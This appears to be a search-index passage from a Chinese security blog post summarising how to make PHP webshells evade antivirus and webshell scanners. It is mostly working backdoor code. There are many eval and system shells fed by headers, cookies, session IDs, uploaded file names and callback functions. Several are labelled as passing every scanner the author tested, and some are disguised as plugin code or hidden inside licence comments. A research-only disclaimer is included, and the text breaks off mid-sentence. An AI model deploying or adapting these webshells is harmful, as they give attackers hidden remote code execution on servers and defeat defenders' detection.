getNamedItemNS->dom_namednodemap_get_named_item_ns setNamedItemNS->dom_namednodemap_set_named_item_ns removeNamedItemNS->dom_namednodemap_remove_named_item_ns count->dom_namednodemap_count getName->dom_namelist_get_name getNamespaceURI->dom_namelist_get_namespace_uri insertBefore->dom_node_insert_before replaceChild->dom_node_replace_child removeChild->dom_node_remove_child appendChild->dom_node_append_child hasChildNodes->dom_node_has_child_nodes cloneNode->dom_node_clone_node normalize->dom_node_normalize isSupported->dom_node_is_supported hasAttributes->dom_node_has_attributes compareDocumentPosition->dom_node_compare_document_position isSameNode->dom_node_is_same_node lookupPrefix->dom_node_lookup_prefix isDefaultNamespace->dom_node_is_default_namespace lookupNamespaceUri->dom_node_lookup_namespace_uri isEqualNode->dom_node_is_equal_node getFeature->dom_node_get_feature setUserData->dom_node_set_user_data getUserData->dom_node_get_user_data item->dom_nodelist_item count->dom_nodelist_count findOffset16->dom_string_extend_find_offset16 findOffset32->dom_string_extend_find_offset32 splitText->dom_text_split_text isWhitespaceInElementContent->dom_text_is_whitespace_in_element_content isElementContentWhitespace->dom_text_is_whitespace_in_element_content replaceWholeText->dom_text_replace_whole_text handle->dom_userdatahandler_handle registerNamespace->dom_xpath_register_ns query->dom_xpath_query evaluate->dom_xpath_evaluate registerPhpFunctions->dom_xpath_register_php_functions ftp_quit->ftp_close imap_header->imap_headerinfo imap_listmailbox->imap_list imap_getmailboxes->imap_list_full imap_scanmailbox->imap_listscan imap_listsubscribed->imap_lsub imap_getsubscribed->imap_lsub_full imap_fetchtext->imap_body imap_scan->imap_listscan imap_create->imap_createmailbox imap_rename->imap_renamemailbox ldap_close->ldap_unbind ldap_get_values->ldap_get_values_len ldap_modify->ldap_mod_replace mysqli_execute->mysqli_stmt_execute mysqli_escape_string->mysqli_real_escape_string mysqli_set_opt->mysqli_options autocommit->mysqli_autocommit begin_transaction->mysqli_begin_transaction change_user->mysqli_change_user character_set_name->mysqli_character_set_name close->mysqli_close commit->mysqli_commit connect->mysqli_connect dump_debug_info->mysqli_dump_debug_info debug->mysqli_debug get_charset->mysqli_get_charset get_client_info->mysqli_get_client_info get_client_info->mysqli_get_client_info get_connection_stats->mysqli_get_connection_stats get_server_info->mysqli_get_server_info get_warnings->mysqli_get_warnings init->mysqli_init_method kill->mysqli_kill multi_query->mysqli_multi_query construct->mysqli_link_construct more_results->mysqli_more_results next_result->mysqli_next_result options->mysqli_options ping->mysqli_ping prepare->mysqli_prepare query->mysqli_query real_connect->mysqli_real_connect real_escape_string->mysqli_real_escape_string escape_string->mysqli_real_escape_string real_query->mysqli_real_query release_savepoint->mysqli_release_savepoint rollback->mysqli_rollback savepoint->mysqli_savepoint select_db->mysqli_select_db set_charset->mysqli_set_charset set_opt->mysqli_options ssl_set->mysqli_ssl_set stat->mysqli_stat stmt_init->mysqli_stmt_init store_result->mysqli_store_result thread_safe->mysqli_thread_safe use_result->mysqli_use_result refresh->mysqli_refresh construct->mysqli_result_construct close->mysqli_free_result free->mysqli_free_result data_seek->mysqli_data_seek fetch_field->mysqli_fetch_field fetch_fields->mysqli_fetch_fields fetch_field_direct->mysqli_fetch_field_direct fetch_all->mysqli_fetch_all fetch_array->mysqli_fetch_array fetch_assoc->mysqli_fetch_assoc fetch_object->mysqli_fetch_object fetch_row->mysqli_fetch_row field_seek->mysqli_field_seek free_result->mysqli_free_result construct->mysqli_stmt_construct attr_get->mysqli_stmt_attr_get attr_set->mysqli_stmt_attr_set bind_param->mysqli_stmt_bind_param bind_result->mysqli_stmt_bind_result close->mysqli_stmt_close data_seek->mysqli_stmt_data_seek execute->mysqli_stmt_execute fetch->mysqli_stmt_fetch get_warnings->mysqli_stmt_get_warnings result_metadata->mysqli_stmt_result_metadata more_results->mysqli_stmt_more_results next_result->mysqli_stmt_next_result num_rows->mysqli_stmt_num_rows send_long_data->mysqli_stmt_send_long_data free_result->mysqli_stmt_free_result reset->mysqli_stmt_reset prepare->mysqli_stmt_prepare store_result->mysqli_stmt_store_result get_result->mysqli_stmt_get_result oci_free_cursor->oci_free_statement ocifreecursor->oci_free_statement ocibindbyname->oci_bind_by_name ocidefinebyname->oci_define_by_name ocicolumnisnull->oci_field_is_null ocicolumnname->oci_field_name ocicolumnsize->oci_field_size ocicolumnscale->oci_field_scale ocicolumnprecision->oci_field_precision ocicolumntype->oci_field_type ocicolumntyperaw->oci_field_type_raw ociexecute->oci_execute ocicancel->oci_cancel ocifetch->oci_fetch ocifetchstatement->oci_fetch_all ocifreestatement->oci_free_statement ociinternaldebug->oci_internal_debug ocinumcols->oci_num_fields ociparse->oci_parse ocinewcursor->oci_new_cursor ociresult->oci_result ociserverversion->oci_server_version ocistatementtype->oci_statement_type ocirowcount->oci_num_rows ocilogoff->oci_close ocilogon->oci_connect ocinlogon->oci_new_connect ociplogon->oci_pconnect ocierror->oci_error ocifreedesc->oci_free_descriptor ocisavelob->oci_lob_save ocisavelobfile->oci_lob_import ociwritelobtofile->oci_lob_export ociloadlob->oci_lob_load ocicommit->oci_commit ocirollback->oci_rollback ocinewdescriptor->oci_new_descriptor ocisetprefetch->oci_set_prefetch ocipasswordchange->oci_password_change ocifreecollection->oci_free_collection ocinewcollection->oci_new_collection ocicollappend->oci_collection_append ocicollgetelem->oci_collection_element_get ocicollassignelem->oci_collection_element_assign ocicollsize->oci_collection_size ocicollmax->oci_collection_max ocicolltrim->oci_collection_trim load->oci_lob_load tell->oci_lob_tell truncate->oci_lob_truncate erase->oci_lob_erase flush->oci_lob_flush setbuffering->ocisetbufferinglob getbuffering->ocigetbufferinglob rewind->oci_lob_rewind read->oci_lob_read eof->oci_lob_eof seek->oci_lob_seek write->oci_lob_write append->oci_lob_append size->oci_lob_size writetofile->oci_lob_export export->oci_lob_export import->oci_lob_import writetemporary->oci_lob_write_temporary close->oci_lob_close save->oci_lob_save savefile->oci_lob_import free->oci_free_descriptor append->oci_collection_append getelem->oci_collection_element_get assignelem->oci_collection_element_assign assign->oci_collection_assign size->oci_collection_size max->oci_collection_max trim->oci_collection_trim free->oci_free_collection odbc_do->odbc_exec odbc_field_precision->odbc_field_len openssl_free_key->openssl_pkey_free openssl_get_privatekey->openssl_pkey_get_private openssl_get_publickey->openssl_pkey_get_public pcntl_errno->pcntl_get_last_error pg_exec->pg_query pg_getlastoid->pg_last_oid pg_cmdtuples->pg_affected_rows pg_errormessage->pg_last_error pg_numrows->pg_num_rows pg_numfields->pg_num_fields pg_fieldname->pg_field_name pg_fieldsize->pg_field_size pg_fieldtype->pg_field_type pg_fieldnum->pg_field_num pg_fieldprtlen->pg_field_prtlen pg_fieldisnull->pg_field_is_null pg_freeresult->pg_free_result pg_result->pg_fetch_result pg_loreadall->pg_lo_read_all pg_locreate->pg_lo_create pg_lounlink->pg_lo_unlink pg_loopen->pg_lo_open pg_loclose->pg_lo_close pg_loread->pg_lo_read pg_lowrite->pg_lo_write pg_loimport->pg_lo_import pg_loexport->pg_lo_export pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding posix_errno->posix_get_last_error session_commit->session_write_close snmpwalkoid->snmprealwalk snmp_set_oid_numeric_print->snmp_set_oid_output_format socket_getopt->socket_get_option socket_setopt->socket_set_option sodium_crypto_scalarmult_base->sodium_crypto_box_publickey_from_secretkey join->implode chop->rtrim strchr->strstr srand->mt_srand getrandmax->mt_getrandmax show_source->highlight_file ini_alter->ini_set checkdnsrr->dns_check_record getmxrr->dns_get_mx doubleval->floatval is_integer->is_int is_long->is_int is_double->is_float fputs->fwrite set_file_buffer->stream_set_write_buffer socket_set_blocking->stream_set_blocking stream_register_wrapper->stream_wrapper_register stream_register_wrapper->stream_wrapper_register socket_set_timeout->stream_set_timeout dir->getdir is_writeable->is_writable diskfreespace->disk_free_space pos->current sizeof->count key_exists->array_key_exists close->closedir rewind->rewinddir importStylesheet->xsl_xsltprocessor_import_stylesheet transformToDoc->xsl_xsltprocessor_transform_to_doc transformToUri->xsl_xsltprocessor_transform_to_uri transformToXml->xsl_xsltprocessor_transform_to_xml setParameter->xsl_xsltprocessor_set_parameter getParameter->xsl_xsltprocessor_get_parameter removeParameter->xsl_xsltprocessor_remove_parameter hasExsltSupport->xsl_xsltprocessor_has_exslt_support registerPHPFunctions->xsl_xsltprocessor_register_php_functions setProfiling->xsl_xsltprocessor_set_profiling setSecurityPrefs->xsl_xsltprocessor_set_security_prefs getSecurityPrefs->xsl_xsltprocessor_get_security_prefs gzrewind->rewind gzclose->fclose gzeof->feof gzgetc->fgetc gzgets->fgets DEP_FALIAS(gzgetss->fgetss gzread->fread gzpassthru->fpassthru gzseek->fseek gztell->ftell gzwrite->fwrite gzputs->fwrite getallheaders->apache_request_headers getallheaders->litespeed_request_headers apache_request_headers->litespeed_request_headers apache_response_headers->litespeed_response_headers \u8fd9\u91cc\u9644\u7684\u8868\u4e0d\u5305\u542b\u88ab\u5f03\u7528\u7684(\u4f1a\u6709PHP\u8b66\u544a,\u4f46\u4ecd\u53ef\u7528),\u800c\u5728\u8fd9\u4e9b\u522b\u540d\u4e2d,\u6211\u4eec\u5c31\u53ef\u4ee5\u627e\u5230\u53ef\u4ee5\u5229\u7528\u7684\u51fd\u6570mbereg replace,\u8fd9\u4e2a\u51fd\u6570\u662fmb ereg replace\u7684\u522b\u540d,mb ereg replace\u4e0epreg replace\u7c7b\u4f3c,\u53ef\u4ee5\u5229\u7528e\u6a21\u5f0f\u9690\u5f0f\u6267\u884c\u4ee3\u7801,\u4f46\u662fmb ereg replace\u65e0\u6cd5\u9003\u8fc7\u67e5\u6740,\u800cmbereg replace\u5219\u662fALLKILL,\u6ca1\u9519,\u53ea\u662f\u4e00\u4e2a \u7684\u5dee\u522b,\u8ba9\u4ed6\u9003\u8fc7\u4e86\u514d\u6740\u7684\u773c\u775b <?php // (ALLKILL) error_reporting ( 0 ); mbereg_replace ( '.*' , '\\0' , $_REQUEST [ 2333 ], 'mer' ); //php5 php7 success ?> \u53e6\u5916,\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\u522b\u540d,\u5982: <?php // PHP >=5.6 \u53ef\u8fc7\u76fe\u72d7 use function \\system as strlen ; // \u914d\u5408\u6587\u4ef6\u5305\u542b\u8fd9\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u52ab\u6301,\u7559\u5f85\u4f60\u4eec\u5f00\u53d1 strlen ( $_POST [ 1 ]); <?php // (ALLKILL) define ( \"ARRAY2\" , \"sys\" . \"tem\" ); @ constant ( \"ARRAY2\" )( pos ( pos ( $GLOBALS ))); // PHP>7 \u514d\u8d23\u58f0\u660e: \u5728\u5bf9\u65b9\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u6216\u95f4\u63a5\u5229\u7528\u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u7814\u7a76\u6837\u672c\u653b\u51fb\u76ee\u6807\u662f\u8fdd\u6cd5\u884c\u4e3a. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u4ec5\u4e3a\u5b89\u5168\u7814\u7a76\u548c\u6388\u6743\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u5176\u4f7f\u7528\u4eba\u5458\u6709\u8d23\u4efb\u548c\u4e49\u52a1\u9075\u5b88\u5f53\u5730\u6cd5\u5f8b\u6761\u89c4. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u6837\u672c\u53ca\u6587\u7ae0\u4ec5\u4e3a\u4fc3\u8fdb\u5b89\u5168\u9632\u5fa1\u7814\u7a76\u4f7f\u7528\uff0c\u7814\u7a76\u4eba\u5458\u5bf9\u56e0\u8bef\u7528\u8be5\u7a0b\u5e8f\u9020\u6210\u7684\u8d44\u4ea7\u635f\u574f\u548c\u635f\u5931\u6982\u4e0d\u8d1f\u8d23.","title":"webshell\u514d\u6740\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#webshell\u514d\u6740\u603b\u7ed3","text":"\u4ee5\u4e0b\u5185\u5bb9\u57fa\u4e8ePHP7 \u6700\u8fd1\u5bf9webshell\u7684\u514d\u6740\u673a\u5236\u4ea7\u751f\u4e86\u6d53\u539a\u7684\u5174\u8da3,\u4e8e\u662f\u5f00\u59cb\u8fdb\u884c\u7814\u7a76,\u53c2\u8003\u4e86\u7f51\u4e0a\u8bb8\u8bb8\u591a\u591a\u7684\u6587\u7ae0,\u4ee5\u4e0b\u662f\u6211\u5bf9webshell\u514d\u6740\u7684\u4e00\u4e9b\u603b\u7ed3 \u4f7f\u7528\u4ee5\u4e0b\u7f51\u7ad9\u53ca\u514d\u6740\u5de5\u5177\u8fdb\u884c\u514d\u6740\u6d4b\u8bd5(\u5e26\u661f\u53f7\u7684\u8868\u793a\u6211\u8ba4\u4e3a\u68c0\u6d4b\u6548\u679c\u6bd4\u8f83\u597d\u7684\u5de5\u5177/\u7f51\u7ad9): webshellchop \u957f\u4ead(*) \u6df1\u5ea6\u5b66\u4e60 WEBDIR+ \u767e\u5ea6(*) \u6cb3\u9a6c\u5728\u7ebf\u67e5\u6740 D\u76fe \u5b89\u5168\u72d7 \u53c2\u8003\u6587\u7ae0: https://www.freebuf.com/articles/web/155891.html https://bbs.symbo1.com/t/topic/94 https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html https://xz.aliyun.com/t/5152 http://webshell.cdxy.me/ \u4e0b\u7684\u8bc4\u8bba ...","title":"webshell\u514d\u6740\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u514d\u6740\u6280\u672f\u57fa\u7840","text":"","title":"\u514d\u6740\u6280\u672f\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u524d\u8a00","text":"\u5bf9\u4e8ewebshell\u7684\u514d\u6740\u800c\u8a00,PHP5\u4e0ePHP7\u6709\u5f88\u5927\u7684\u4e0d\u540c,\u5728PHP7\u4e4b\u540e,assert\u8fd9\u4e2a\u9a6c\u513f\u5e38\u7528\u7684\u51fd\u6570\u53d8\u6210\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8eeval\u7684\u8bed\u6cd5\u6784\u9020,\u8fd9\u4f7f\u5f97\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7\u52a8\u6001\u51fd\u6570\u7684\u65b9\u5f0f\u6765\u8c03\u7528assert,\u8fd9\u65e0\u7591\u662f\u5bf9\u514d\u6740\u7684\u4e00\u6b21\u6c89\u91cd\u6253\u51fb.(\u7ecf\u8fc7\u4e25\u683c\u6d4b\u8bd5,\u5728PHP7.0.33\u4e2d\u4f9d\u7136\u53ef\u4ee5,\u731c\u6d4b\u5e94\u8be5\u662fPHP7.1\u4ee5\u540e),\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8f6c\u53d8\u601d\u8def\u4e86.\u6807\u6709(ALLKILL)\u5b57\u6837\u7684webshell\u901a\u8fc7\u4e86\u672c\u6587\u63d0\u5230\u7684\u6240\u6709\u67e5\u6740","title":"\u524d\u8a00"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u53e6\u7c7b\u7684\u5165\u53e3","text":"\u6211\u4eec\u5e38\u89c1\u7684webshell\u5165\u53e3\u90fd\u662f GET, POST\u4e4b\u7c7b\u7684,\u4f46\u662f\u5176\u5b9e\u4e00\u5207\u7684\u5165\u53e3\u6211\u4eec\u90fd\u53ef\u4ee5\u8fdb\u884c\u5229\u7528,\u4ee5\u6b64\u6765\u9003\u8fc7\u67e5\u6740: $_GET $_POST $_COOKIE $_REQUEST $ SERVER \u5176\u4e2d\u7684\u67d0\u4e9b\u53c2\u6570\u53ef\u63a7,\u5982REQUEST METHOD,QUERY STRING,HTTP USER_AGENT\u7b49 session_id() \u8fd9\u4e2a\u6bd4\u8f83\u7279\u6b8a,\u4f46\u662f\u4f9d\u7136\u53ef\u4ee5\u5229\u7528 $_FILE $GLOBALS getallheaders() get defined vars() get defined functions() \u4e0b\u9762\u4e3e\u51e0\u4e2a\u4f8b\u5b50: <?php @ eval ( urldecode ( $_FILES [ 'file' ][ 'name' ])); // \u8be5\u9a6c\u4f1a\u628a\u53cc\u5f15\u53f7\u7ed9URL\u7f16\u7801, // \u56e0\u6b64\u5982\u679cpayload\u4e2d\u6709\u53cc\u5f15\u53f7\u5219\u9700\u8981\u5957\u4e00\u5c42urldecode @ eval ( urldecode ( $_FILES [ 'file' ][ 'type' ])); // \u8be5p\u9a6c\u4f1a\u628a\u5206\u53f7\u5403\u6389,\u56e0\u6b64\u9700\u8981\u5bf9\u5206\u53f7\u8fdb\u884c\u7f16\u7801\u5982URL\u7f16\u7801(%3B) //\u56e0\u6b64\u9700\u8981\u5957\u4e00\u5c42urldecode ?> <?php @ eval ( hex2bin ( $_SERVER [ 'REQUEST_METHOD' ])); // \u8be5\u9a6c\u901a\u8fc7\u8bbe\u7f6e\u8bf7\u6c42\u65b9\u5f0f\u6765\u5b9e\u73b0\u6267\u884c,\u7531\u4e8e\u7b26\u53f7\u95ee\u9898 // \u9700\u8981\u7528bin2hex\u5bf9payload\u8fdb\u884c\u7f16\u7801 ?> <?php $a = $_SERVER [ 'QUERY_STRING' ]; //\u4f8b\u5b50 ?php=info()& $a = str_replace ( \"&\" , \";\" , $a ); $a = str_replace ( \"=\" , \"\" , $a ); @ eval ( $a ); ?> <?php @ eval ( getallheaders ()[ 'Referer' ]); <?php // (ALLKILL) error_reporting ( 0 ); eval ( null . implode ( reset ( get_defined_vars ()))); // php>=5.5 ?a=echo 1; ?> <?php // (ALLKILL) error_reporting ( 0 ); define ( \"SS\" , \"session_start\" ); function result ( $arg ) { return 1 > 0 ? @ $arg : 0 ; } function hex22bin ( $data ) { $len = strlen ( $data ); return pack ( \"H\" . $len , $data ); } class deal { function combine_var ( $default = NULL ){ if ( ! constant ( \"SS\" )) { return $default ; } if ( ! preg_match ( '/\\w+/' , $this -> sess )) { throw new Exception ( \" $this->sess error\" ); } $results = null ; //trash $results = result ( $this -> sess ); @ eval ( \" $this->sess \" ); // PHP>=5.4 // Cookie: PHPSESSID=706870696e666f28293b == phpinfo(); hex2bin(\"phpinfo();\") => 706870696e666f28293b } function __construct ( $arg ){ $this -> sess = $arg ; return $this -> combine_var (); } } $son = constant ( \"SS\" ); $son (); $sessionid = session_id (); $sessionid = hex22bin ( $sessionid ); $deals = new deal ( $sessionid ); ?> \u5176\u4e2d\u6bd4\u8f83\u503c\u5f97\u6ce8\u610f\u7684\u662fGLOBALS,get defined vars(),getallheaders() GLOBALS,get defined vars(): \u4e00\u4e2a\u662f\u8d85\u5168\u5c40\u53d8\u91cf,\u4e00\u4e2a\u662f\u51fd\u6570,\u8fd4\u56de\u503c\u90fd\u662f\u4e00\u4e2a\u591a\u7ef4\u6570\u7ec4,\u5305\u542b\u4e86 GET, POST\u7b49\u5176\u4ed6\u8d85\u5168\u5c40\u53d8\u91cf,\u53ef\u4ee5\u501f\u6b64\u6765\u5bf9\u88f8\u9732\u7684\u8f93\u5165\u8fdb\u884c\u5d4c\u5957,\u5982\u7528GLOBALS[' POST'][1]\u4ee3\u66ff POST[1] getallheaders(): \u83b7\u53d6\u6240\u6709\u7684\u8bf7\u6c42\u5934(\u8be5\u51fd\u6570\u62e5\u6709\u4e00\u4e9b\u9650\u5236,\u5177\u4f53\u8bf7\u53c2\u7167 \u8fd9\u91cc ) \u540c\u6837\u53ef\u4ee5\u501f\u6b64\u6765\u5c1d\u8bd5\u9003\u8fc7\u5bf9\u8f93\u5165\u7684\u68c0\u67e5 \u8fd9\u91cc\u518d\u8bf4\u51e0\u4e2aPHP\u7684\u51fd\u6570 pos(),current(),reset():\u8fd9\u4e09\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u90fd\u662f\u4f20\u5165\u6570\u7ec4\u7684\u4e00\u4e2a\u5143\u7d20 next():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 end():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 implode():\u53ef\u4ee5\u5c06\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u62fc\u63a5\u8d77\u6765,\u5982\u62fc\u63a5\u6210\u5b57\u7b26\u4e32 \u53ef\u4ee5\u770b\u5230 evil5.php \u4e2d\u6211\u4eec\u4ec5\u4ec5\u5bf9\u8f93\u5165\u8fdb\u884c\u5904\u7406,\u62fc\u63a5null\u5c31\u8eb2\u8fc7\u4e86\u6240\u6709\u7684\u67e5\u6740. \u9664\u4e86\u4e0a\u8ff0\u65b9\u6cd5\u4e4b\u5916,\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u4e0d\u540c\u7684\"\u95e8\"\u8fdb\u5165,\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4: system() exec() shell_exec() passthru() proc_open() `` // \u53cd\u5f15\u53f7\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u6216\u8005\u4f7f\u7528\u4e00\u4e9b\u533f\u540d\u51fd\u6570,\u52a8\u6001\u8c03\u7528\u51fd\u6570,\u56de\u8c03\u51fd\u6570: call user func call user func_array array_filter array_map uasort, uksort array_reduce array_udiff array_walk array walk recursive preg replace, mb ereg_replace preg_filter register shutdown function register tick function filter_var filter var array \u7c7b\u7684\u53cd\u5c04->invoke() include file get contents create function // \u6211\u5c1d\u8bd5\u7528create function\u6765\u521b\u9020\u514d\u6740webshell,\u4f46\u4f3c\u4e4e\u603b\u662f\u7ed5\u4e0d\u8fc7\u957f\u4ead <?php // (ALLKILL) error_reporting ( 0 ); function compare_by_area ( $a , $b ) { $areaA = substr ( $a -> width . $a -> height , 4 ); $areaB = substr ( $b -> width . $b -> height , 4 ); if ( $areaA ( $areaB )) { return - 1 ; } elseif ( $areaA == $areaB ) { return 1 ; } else { return 0 ; } } $array1 = array ( new stdclass ); $array1 [ 0 ] -> width = 'code' ; $array1 [ 0 ] -> height = 'sys' . 'tem' ; $array2 = array ( new stdclass ); $array2 [ 0 ] -> width = 'args' ; $array2 [ 0 ] -> height = pos ( next ( $GLOBALS )); array_udiff ( $array1 , $array2 , 'compare_by_area' ); // PHP >=5.3 \u603b\u7684\u6765\u8bf4,\u5165\u53e3\u5343\u4e07\u6761,\u5b89\u5168\u7b2c\u4e00\u6761,\u514d\u6740\u4e0d\u5230\u4f4d,\u9762\u58c1\u7a7a\u6d41\u6cea.\u5404\u4f4d\u5e08\u5085\u4eec\u53ef\u4ee5\u81ea\u884c\u6d4b\u8bd5\u4e0b\u8fd9\u4e9b\u5165\u53e3","title":"\u53e6\u7c7b\u7684\u5165\u53e3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u53d8\u5f62\u4e0e\u4f2a\u88c5","text":"\u53d8\u5f62\u53ef\u80fd\u662f\u6211\u4eec\u6700\u5e38\u89c1\u7684bypass\u624b\u6bb5\u4e86,\u4f46\u4ecd\u7136\u662f\u6211\u4eec\u901a\u8fc7\u52a8\u6001\u68c0\u6d4b\u7684\u597d\u624b\u6bb5,PHP\u4e2d\u81ea\u5e26\u4e86\u5927\u91cf\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u5904\u7406\u53d8\u5f62\u4e0e\u7f16\u7801\u7684\u51fd\u6570,\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u5bf9\u6211\u4eec\u7684webshell\u8fdb\u884c\u64cd\u4f5c \u4ee5\u4e0b\u662f\u4e00\u4e9bPHP\u81ea\u5e26\u7684\u51fd\u6570: substr_replace substr strtr str_rot13 base64_encode chr bin2hex strrev urlencode json_encode pack gzcompress/gzdeflate/gzencode ... \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5341\u516d\u8fdb\u5236/\u516b\u8fdb\u5236\u7f16\u7801,\u53d6\u53cd\uff0c\u5f02\u6216\uff0c\u52a0\u5bc6\uff0c\u5e8f\u5217\u5316,\u51fd\u6570\u540d\u5927\u5c0f\u5199\u7b49\u7b49\u6765\u5bf9webshell\u8fdb\u884c\u53d8\u5f62,\u4f8b\u5982\u5229\u7528\u5341\u516d\u8fdb\u5236\u4e0e\u516b\u8fdb\u5236\u6df7\u7f16\u7684ALLKILL webshell: <?php // (ALLKILL) \u53c2\u8003https://www.freebuf.com/articles/web/155891.html\u4e2d\u8fdb\u5236\u8f6c\u6362\u65b9\u5f0f $v230c590 = \" \\x62\\x61\\163\\x65\\x36\\x34\\137\\144\\145\\x63\\x6f\\144\\145 \" ; @ eval ( '' . $v230c590 ( null . next ( post ( $GLOBALS )); \u53c8\u5982\u5229\u7528\u9762\u5411\u5bf9\u8c61\u7279\u6027,\u5b57\u7b26\u62fc\u63a5,\u52a8\u6001\u8c03\u7528\u53d8\u5f62\u7684ALLKILL webshell: <?php // (ALLKILL) $name = basename ( __FILE__ ); class combine { function __construct ( $var , $srcname ) { $this -> var = $var ; $this -> name = $srcname ; $this -> cookie = get_class ( $this ); $this -> cookie = $this -> cookie [ 2 ]; } function __combine ( $yum ) { $run = $this -> var ; $run .= $this -> name [ 3 ]; $run .= 'e' . $this -> cookie ; $this -> yum = $yum ; $run ( '' . $this -> yum ); } } $result = new combine ( 'sys' , $name ); // php5 php7 success die ( $result -> __combine ( $_GET [ 2333 ])); \u4f2a\u88c5\u5219\u662f\u4e00\u79cd\u6709\u6548\u901a\u8fc7\u9759\u6001\u68c0\u6d4b\u7684\u65b9\u6cd5(\u867d\u7136\u6709\u70b9\u7384\u5b66,\u4f8b\u5982D\u76fe\u4f3c\u4e4e\u6709\u5bf9\u6587\u4ef6\u884c\u6570\u8fdb\u884c\u5224\u65ad),\u6211\u4eec\u5c06webshell\u4f2a\u88c5\u6210\u4e00\u4e2a\u6b63\u5e38\u7684\u529f\u80fd,\u5e76\u914d\u4e0a\u63a9\u4eba\u8033\u76ee\u7684\u540d\u5b57,\u751a\u81f3\u53ef\u4ee5\u9003\u8fc7\u7ba1\u7406\u5458\u7684\u68c0\u67e5,\u4f8b\u5982\u4e0b\u9762\u51e0\u4e2a\u4f8b\u5b50: <?php /** * new plugin * @author xxcms * @package Glimmer * @subpackage PluginsShared */ /** * get a compiler parameter and echo to console */ function get_compiler_param ( $params , $index , $default = null ) { if ( ! isset ( $params [ $index ])) { return $default ; } if ( ! preg_match ( '/^([\\'\"]?)[a-zA-Z0-9](\\\\1)/' , $params [ $index ])) { throw new Exception ( \" $index is not a literal\" ); } $t = null ; eval ( \" \\$ t = \" . $params [ $index ]); return $t ; } $params = array ( 'code' => $_GET [ 2333 ]); $a = get_compiler_param ( $params , 'code' , \"whoami\" ); if ( isset ( $_GET [ 'print' ])){ echo ( \"<script>console.log('\" . $a . \"');</script>\" ); } <?php // \u8fd9\u4e2a\u9a6c\u7531\u4e8eextract\u53ca\u660e\u663e\u7684\u52a8\u6001\u8c03\u7528\u8fc7\u4e0d\u4e86\u514d\u6740,\u4f46\u662f\u4ecd\u4e0d\u5931\u4e3a\u4e00\u79cd\u597d\u601d\u8def // copy from http://webshell.cdxy.me/ /* GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/> Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed. Preamble The GNU General Public License is a free, copyleft license for software and other kinds of works. The licenses for most software and other practical works are designed to take away your freedom to share and change the works. By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users. We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors. You can apply it to your programs, too. When we speak of free software, we are referring to freedom, not price. Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things. To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights. Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others. For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received. You must make sure that they, too, receive or can get the source code. And you must show them these terms so they know their rights. Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you */ extract ( $_COOKIE ); /* copy, distribute and/or modify it. For the developers' and authors' protection, the GPL clearly explains that there is no warranty for this free software. For both users' and authors' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions. Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so. This is fundamentally incompatible with the aim of protecting users' freedom to change the software. The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable. Therefore, we have designed this version of the GPL to prohibit the practice for those products. If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users. Finally, every program is threatened constantly by software patents. States should not allow patents to 